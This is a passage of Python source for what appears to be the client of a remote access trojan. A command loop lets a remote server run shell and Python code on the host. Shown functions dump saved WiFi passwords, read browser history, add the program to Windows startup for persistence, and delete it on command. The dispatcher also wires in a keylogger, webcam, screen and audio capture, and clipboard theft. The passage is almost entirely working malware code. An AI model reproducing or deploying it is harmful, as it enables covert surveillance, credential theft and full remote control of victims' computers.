                send_output(f"CMD_OUTPUT:Error reading {browser_name} history: {e}")
                if 'conn' in locals() and conn: conn.close()
                if 'temp_history_path' in locals() and os.path.exists(temp_history_path): os.remove(temp_history_path)
    
    if history_data:
        send_output(f"CMD_OUTPUT:Browser History (Last 100 entries):\n{''.join(history_data)}")
    elif found_browser:
        send_output("CMD_OUTPUT:No browser history found or accessible for supported browsers.")
    else:
        send_output("CMD_OUTPUT:No supported browser history files found.")


def handle_wifi_list_command():
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output("netsh wlan show networks", shell=True, text=True, stderr=subprocess.STDOUT)
        elif platform.system() == "Linux":
            output = subprocess.check_output("nmcli -f SSID,MODE,CHAN,RATE,SIGNAL,BARS,SECURITY,ACTIVE device wifi list", shell=True, text=True, stderr=subprocess.STDOUT)
        elif platform.system() == "Darwin":
            output = subprocess.check_output("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s", shell=True, text=True, stderr=subprocess.STDOUT)
        else:
            send_output("CMD_OUTPUT:Unsupported OS for WiFi listing.")
            return

        send_output(f"CMD_OUTPUT:WiFi Networks:\n{output.strip()}")
    except Exception as e:
        send_output(f"CMD_OUTPUT:Error listing WiFi networks: {e}")

def handle_wifi_passwords_command():
    try:
        if platform.system() == "Windows":
            profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, stderr=subprocess.STDOUT)
            profiles = [line.split(":", 1)[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]
            
            passwords = []
            for profile in profiles:
                try:
                    key_content_output = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True, stderr=subprocess.STDOUT)
                    password_line = [line for line in key_content_output.splitlines() if "Key Content" in line]
                    if password_line:
                        password = password_line[0].split(":", 1)[1].strip()
                        passwords.append(f"SSID: {profile}, Password: {password}")
                    else:
                        passwords.append(f"SSID: {profile}, Password: None (Open or no key stored)")
                except Exception as e_profile:
                    passwords.append(f"SSID: {profile}, Error: {e_profile}")
            
            output = "\n".join(passwords) if passwords else "No WiFi profiles with saved passwords found."
            send_output(f"CMD_OUTPUT:WiFi Passwords:\n{output}")

        else:
            send_output("CMD_OUTPUT:WiFi password retrieval currently supported only on Windows.")

    except Exception as e:
        send_output(f"CMD_OUTPUT:Error retrieving WiFi passwords: {e}")

def handle_add_startup_command():
    if platform.system() == "Windows":
        try:
            # Copy client executable to AppData Roaming Startup folder
            # Assumes the client is run as an executable (e.g., compiled with PyInstaller)
            # sys.executable points to the current Python interpreter or the executable
            client_exe_path = sys.executable 
            startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder)
            
            # Use the basename of the executable for the new file name in startup
            startup_file_name = os.path.basename(client_exe_path)
            destination_path = os.path.join(startup_folder, startup_file_name)

            if client_exe_path.lower() == destination_path.lower(): # Already in startup or trying to copy to self
                send_output("CMD_OUTPUT:Client is already in a startup location or attempting to copy to its own path.")
                return

            shutil.copy2(client_exe_path, destination_path)
            send_output(f"CMD_OUTPUT:Added client to startup: {destination_path}")
        except Exception as e:
            send_output(f"CMD_OUTPUT:Error adding to startup: {e}")
    else:
        send_output("CMD_OUTPUT:Add to startup command only supported on Windows.")

def handle_exec_py_command(python_code):
    try:
        # Create a temporary file to write the Python code
        temp_file_path = os.path.join(tempfile.gettempdir(), f"exec_py_temp_{int(time.time())}.py")
        with open(temp_file_path, "w", encoding="utf-8") as f:
            f.write(python_code)
        
        # Execute the temporary Python file using the system's Python interpreter
        result = subprocess.check_output([sys.executable, temp_file_path], stderr=subprocess.STDOUT, text=True)
        send_output(f"CMD_OUTPUT:Python execution output:\n{result.strip()}")
        os.remove(temp_file_path)
    except subprocess.CalledProcessError as e:
        send_output(f"CMD_OUTPUT:Python execution failed:\n{e.output.strip()}")
        if os.path.exists(temp_file_path): os.remove(temp_file_path)
    except Exception as e:
        send_output(f"CMD_OUTPUT:Error executing Python code: {e}")
        if os.path.exists(temp_file_path): os.remove(temp_file_path)

def handle_change_background_command(image_filename):
    """
    Client receives an image from server (via send_file) and then
    this command is triggered to set it as background.
    """
    if platform.system() == "Windows":
        try:
            full_image_path = os.path.join(tempfile.gettempdir(), image_filename)
            if not os.path.exists(full_image_path):
                send_output(f"CMD_OUTPUT:Error: Image file not found for background: {image_filename}")
                return
            
            SPI_SETDESKWALLPAPER = 0x14
            SPIF_UPDATEINIFILE = 0x01
            SPIF_SENDCHANGE = 0x02

            # Ensure the path is absolute and uses backslashes for ctypes
            abs_path = os.path.abspath(full_image_path).replace('/', '\\')
            
            # Set the desktop wallpaper
            if ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE):
                send_output(f"CMD_OUTPUT:Desktop background changed to: {image_filename}")
            else:
                send_output(f"CMD_OUTPUT:Failed to change desktop background.")
            
            # Optionally remove the temporary image file after setting background
            # os.remove(full_image_path)

        except Exception as e:
            send_output(f"CMD_OUTPUT:Error changing background: {e}")
    else:
        send_output("CMD_OUTPUT:Change background command only supported on Windows.")

def handle_self_destruct_command():
    # This command attempts to remove the client executable and exit
    try:
        # Get path of the running executable/script
        current_script_path = os.path.abspath(sys.argv[0])
        
        # On Windows, try to delete after process exits.
        # Create a batch script that deletes the main executable and then deletes itself
        if platform.system() == "Windows":
            temp_dir = tempfile.gettempdir()
            killer_script = os.path.join(temp_dir, f"cleanup_{int(time.time())}.bat")
            
            with open(killer_script, "w") as f:
                f.write(f'@echo off\n')
                f.write(f'timeout /t 1 /nobreak > NUL\n') # Wait for a second
                f.write(f'del "{current_script_path}"\n') # Delete the main client exe
                f.write(f'del "{killer_script}"\n') # Delete itself
                f.write(f'exit\n')
            
            subprocess.Popen([killer_script], shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            send_output("CMD_OUTPUT:Self-destruct initiated. Client should remove itself.")
            # The client needs to exit immediately after launching the cleanup script
            sys.exit(0)
        else:
            # For Linux/macOS, a simple unlink might work if not in use.
            # More robust would be a small self-deleting script.
            os.remove(current_script_path)
            send_output("CMD_OUTPUT:Self-destruct initiated. Client removed itself.")
            sys.exit(0)

    except Exception as e:
        send_output(f"CMD_OUTPUT:Error during self-destruct: {e}")
        # Even if cleanup fails, the client should still exit
        sys.exit(0)


def main_client_loop():
    global CLIENT_SOCKET
    data_buffer = ""
    while True:
        try:
            if CLIENT_SOCKET is None: # If connection was lost and reconnect failed
                print_client_error("No active connection. Reconnecting...")
                handle_reconnection()
                if not CLIENT_SOCKET: # If reconnection failed
                    break # Exit loop if cannot reconnect

            # Send heartbeat to server every few seconds to keep connection alive and allow server to update last_seen
            # This also serves as a way to check if the connection is still alive
            CLIENT_SOCKET.sendall(b"HEARTBEAT:\n")
            
            # Set a timeout for receiving to gracefully handle unresponsive server
            CLIENT_SOCKET.settimeout(10.0) # 10 seconds timeout

            data = CLIENT_SOCKET.recv(BUFFER_SIZE).decode('utf-8')
            if not data:
                print_client_error("Server disconnected (received no data). Attempting reconnection.")
                handle_reconnection()
                data_buffer = "" # Clear buffer after reconnection attempt
                continue # Go back to start of loop

            data_buffer += data

            while '\n' in data_buffer:
                command_line, data_buffer = data_buffer.split('\n', 1)
                
                if not command_line.strip():
                    continue

                parts = command_line.split(" ", 1)
                command = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""

                if command == "shell": handle_shell_command(args)
                elif command == "cd": handle_cd_command(args)
                elif command == "ls": handle_ls_command(args)
                elif command == "get_file": handle_get_file_command(args)
                elif command == "rm": handle_rm_command(args)
                elif command == "mv": 
                    mv_parts = args.split(" ", 1)
                    if len(mv_parts) == 2: handle_mv_command(mv_parts[0], mv_parts[1])
                    else: send_output("CMD_OUTPUT:Usage: mv <source> <destination>")
                elif command == "cp":
                    cp_parts = args.split(" ", 1)
                    if len(cp_parts) == 2: handle_cp_command(cp_parts[0], cp_parts[1])
                    else: send_output("CMD_OUTPUT:Usage: cp <source> <destination>")
                elif command == "mkdir": handle_mkdir_command(args)
                elif command == "rmdir": handle_rmdir_command(args)
                elif command == "screenshot": handle_screenshot_command()
                elif command == "take_photo": handle_take_photo_command(args)
                elif command == "keylog_start": handle_keylog_start()
                elif command == "keylog_stop": handle_keylog_stop()
                elif command == "webcam_stream_start": handle_webcam_stream_start()
                elif command == "webcam_stream_stop": handle_webcam_stream_stop()
                elif command == "screenshare_stream_start": handle_screenshare_stream_start()
                elif command == "screenshare_stream_stop": handle_screenshare_stream_stop()
                elif command == "audio_record_start": handle_audio_record_start(args)
                elif command == "audio_record_stop": handle_audio_record_stop()
                elif command == "vid_record_start": handle_vid_record_start(args)
                elif command == "vid_record_stop": handle_vid_record_stop()
                elif command == "speak": handle_speak_command(args)
                elif command.startswith("play_audio:"):
                    audio_parts = command_line.split(':', 2) # PLAY_AUDIO:filename:base64data
                    if len(audio_parts) == 3: handle_play_audio_command(audio_parts[1], audio_parts[2])
                    else: send_output("CMD_OUTPUT:Malformed PLAY_AUDIO command.")
                elif command == "processes": handle_processes_command()
                elif command == "kill": handle_kill_command(args)
                elif command == "clipboard_get": handle_clipboard_get_command()
                elif command == "clipboard_set": handle_clipboard_set_command(args)
                elif command == "msgbox": handle_msgbox_command(args)
                elif command == "browse": handle_browse_command(args)
                elif command == "browser_history": handle_browser_history_command()
                elif command == "wifi_list": handle_wifi_list_command()
                elif command == "wifi_passwords": handle_wifi_passwords_command()
                elif command == "add_startup": handle_add_startup_command()
                elif command == "exec_py": handle_exec_py_command(args)
                elif command == "set_bg_exec": handle_change_background_command(args)
                elif command == "self_destruct": handle_self_destruct_command()
                elif command == "heartbeat:": pass # Just a heartbeat, ignore
                else:
                    send_output(f"CMD_OUTPUT:Unknown command: {command_line}")

        except socket.timeout:
            # No data received within timeout, send heartbeat and continue
            pass # Heartbeat already sent at top of loop
        except (BrokenPipeError, ConnectionResetError) as e:
            print_client_error(f"Server disconnected unexpectedly: {e}. Attempting reconnection.")
            handle_reconnection()
            data_buffer = "" # Clear buffer after reconnection attempt
        except Exception as e:
            print_client_error(f"Unexpected ERROR in main client loop: {e}{Style.RESET_ALL}")
            print(traceback.format_exc())
            send_output(f"Client-side error: {e}") # Try to inform server
            handle_reconnection() # Attempt to recover
            data_buffer = ""
            if not CLIENT_SOCKET:
                print(f"{Fore.RED}Could not re-establish connection after unexpected error. Exiting client.{Style.RESET_ALL}")
                break # Exit the while True loop


if __name__ == '__main__':
    # Initial connection attempt
    connect_to_server()
    
    if CLIENT_SOCKET:
        try:
            main_client_loop()
        except KeyboardInterrupt:
            print_client_info("Client shutdown initiated by Ctrl+C.")
        finally:
            if CLIENT_SOCKET:
                try:
                    # Signal threads to stop if any are active, before closing socket
                    handle_keylog_stop()
                    handle_screenshare_stream_stop()
                    handle_webcam_stream_stop()
                    handle_audio_record_stop()
                    handle_vid_record_stop()
                    CLIENT_SOCKET.shutdown(socket.SHUT_RDWR)
                except Exception: pass # Ignore errors on shutdown
                CLIENT_SOCKET.close()
            print_client_info("Client has disconnected.")
    else:
        print(f"{Fore.RED}Failed to connect to server initially. Exiting.{Style.RESET_ALL}")

    print_client_info("Client application finished.")